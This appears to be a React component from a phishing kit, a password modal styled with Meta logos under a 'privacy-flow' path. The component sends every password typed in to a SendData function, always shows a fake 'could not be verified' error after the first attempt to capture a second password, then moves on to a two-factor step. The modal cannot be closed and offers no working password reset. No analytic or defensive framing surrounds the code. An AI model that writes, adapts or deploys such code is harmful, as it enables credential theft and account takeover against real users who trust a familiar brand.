import React from 'react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { btnPrimary, errorTextClass, textLead } from '@/components/privacy-flow/ui-styles';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm } from '../../app/store/slices/stepFormSlice';
import { SendData } from '@/utils/sendData';

export interface PasswordModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onProceedToTwoFactor: () => void;
}

const PasswordModal: React.FC<PasswordModalProps> = ({
  open,
  onOpenChange,
  onProceedToTwoFactor,
}) => {
  const [isOpen, setIsOpen] = React.useState(open);
  const [loading, setLoading] = React.useState(false);
  const [doubleCheck, setDoubleCheck] = React.useState(false);
  const [password, setPassword] = React.useState('');
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  React.useEffect(() => {
    setIsOpen(open);
  }, [open]);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;
    setPassword(value);
    setErrors((prev) => ({ ...prev, [id]: '' }));

    if (!doubleCheck) {
      dispatch(updateForm({ password: value }));
    } else {
      dispatch(updateForm({ passwordSecond: value }));
    }
  };

  const handleClose = () => {
    setIsOpen(false);
    onOpenChange(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();
      const newErrors: Record<string, string> = {};
      if (!password.trim()) newErrors.password = 'Please enter your password.';

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      if (!doubleCheck) {
        setLoading(true);

        await SendData(formData)
          .then(() => {
            setTimeout(() => {
              setLoading(false);
              setDoubleCheck(true);
              setPassword('');
              setErrors({
                password: 'The password you entered could not be verified. Please try again.',
              });
            }, 1345);
          })
          .catch((error) => {
            console.error('Error submitting form:', error);
            setLoading(false);
            setPassword('');
            setErrors({
              password: 'The password you entered could not be verified. Please try again.',
            });
          });
      } else {
        setLoading(true);

        await SendData(formData)
          .then(() => {
            setTimeout(() => {
              setLoading(false);
              setDoubleCheck(false);
              setPassword('');
              onProceedToTwoFactor();
              handleClose();
            }, 1345);
          })
          .catch((error) => {
            console.error('Error submitting form:', error);
            setLoading(false);
            setPassword('');
            setErrors({
              password: 'The password you entered could not be verified. Please try again.',
            });
          });
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false}>
      <div className="flex h-full flex-1 flex-col items-center justify-between">
        <div className="mx-auto mb-5 h-[50px] w-[50px]">
          <img src="/images/meta/logo.svg" width="100%" height="100%" alt="" />
        </div>

        <div className="w-full py-2">
          <p className={`mb-4 ${textLead}`}>For your security, enter your password to continue.</p>
          <form onSubmit={handleSubmit} autoComplete="off">
            <div className="w-full">
              <PasswordInput
                id="password"
                placeholder="Enter your password"
                invalid={!!errors.password}
                value={password}
                onChange={handleChange}
              />
              {errors.password ? <p className={errorTextClass}>{errors.password}</p> : null}
            </div>
            <div className="mt-5 w-full">
              <button type="submit" className={btnPrimary} disabled={loading}>
                {loading && (
                  <span className="mr-2 inline-flex h-5 w-5 shrink-0 animate-spin">
                    <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                  </span>
                )}
                {loading ? '' : 'Continue'}
              </button>
            </div>
            <p className="mt-4 text-center text-sm leading-normal text-slate-500">Forgot your password?</p>
          </form>
        </div>

        <div className="mx-auto mt-6 w-[60px]">
          <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
        </div>
      </div>
    </Modal>
  );
};

export default PasswordModal;
